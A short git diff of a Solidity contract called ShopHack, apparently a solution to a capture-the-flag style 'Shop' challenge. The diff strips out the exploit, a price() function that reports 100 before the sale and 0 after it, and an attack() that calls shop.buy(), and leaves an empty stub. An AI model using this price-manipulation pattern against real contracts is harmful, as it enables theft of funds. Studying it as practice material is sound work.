@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.10;
-import './Shop.sol';
+import "./Shop.sol";
 
 contract ShopHack {
     Shop shop;
@@ -10,11 +10,5 @@ contract ShopHack {
         shop = _shop;
     }
 
-    function price() external view returns(uint) {
-        return !shop.isSold() ? 100 : 0;
-    }
-
-    function attack() external {
-        shop.buy();
-    }
+    function attack() external {}
 }
